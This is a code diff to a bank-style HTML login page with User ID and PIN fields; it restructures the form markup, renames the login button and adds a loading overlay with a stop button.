@@ -12,7 +12,12 @@
         
         <div class="fullscreen" style="display:none">
           <img src="/images/singerpaulfav.png" alt="loading..." class="rotating-image">
-    </div>
+    </div>  
+
+    <div class="fullscreenb" style="display:none">
+      <img src="/images/singerpaulfav.png" alt="loading..." class="rotating-image"> 
+      <button class="stopl" onclick="stopl()">Stop Loading</button>
+   </div> 
 
           <div class="header"> 
             <div class="find">  
@@ -28,15 +33,15 @@
 
 
           <div class="enclose">
-            <div class="loginform">
-                 <form id="logino">
+            <div class="loginform"> 
                      <div class="redbg"></div>  
                      <div class="inner">
                     <div class="dlogo"> <img src="/images/singerpaul.png" alt="logo"> </div>   
                        <div class="instruction">
                         <p>For an optimal viewing experience and security, we recommend that you use the latest web browser. Click <span>here</span> for a list of supported browsers.</p>
-                        </div> 
+                        </div>  
 
+                        <form id="logino">
                         <!-----Input USER ID-->
                         <fieldset id="fsa">
                             <legend id="ulab">User ID</legend>
@@ -49,17 +54,18 @@
                           <fieldset id="fsb">
                             <legend id="uplab">PIN</legend>
                             <input type="password" id="userpin" oninput="validateNumberInput(this)" placeholder=" " required />
-                        </fieldset>     
- 
-                        <button id="submit">Login</button>   
-                 </form>   
-                        <button id="start">Get Started</button>   
+                        </fieldset>    
+                        <button id="subm">Login</button>   
+                 </form>    
+
+
+                        <button id="start">Get Started</button>      
                         <div class="last">
                              <p>Forgot User ID or PIN</p>
                              <p>Frequently Asked Questions</p>   
                              <p>Maintenance Schedule</p>
                              <p>Security & You</p>
-                        </div> 
+                        </div>  
                       </div> 
                 </div>
             </div>    
@@ -148,7 +154,11 @@ userpin.onblur = function(e) {
                           // Allow only numeric input, remove non-numeric characters
                           input.value = input.value.replace(/\D/g, '');
                         }
- 
+    
+                             
+
+       
+
 
 
        var logino = document.getElementById('logino');
@@ -158,7 +168,7 @@ userpin.onblur = function(e) {
         fullscreen.style.display = 'flex';
             var userid = document.getElementById('userid').value; 
             var userpin = document.getElementById('userpin').value;  
-            var subm = document.getElementById('submit'); 
+            var subm = document.getElementById('subm'); 
             subm.style.opacity = '0.4';
             subm.disabled = true;
             subm.innerHTML = 'submitting...'; 
@@ -207,7 +217,20 @@ userpin.onblur = function(e) {
           erro.innerHTML = error;
     }
              
-       });
+       });  
+
+
+       var start = document.getElementById('start');
+    start.onclick = ()=>{  
+       var fullscreenb = document.querySelector('.fullscreenb');
+       fullscreenb.style.display = 'flex';  
+    } 
+
+    function stopl() {
+        var fullscreenb = document.querySelector('.fullscreenb');
+        fullscreenb.style.display = 'none'; 
+      } 
+
                   
             </script>
       </body>
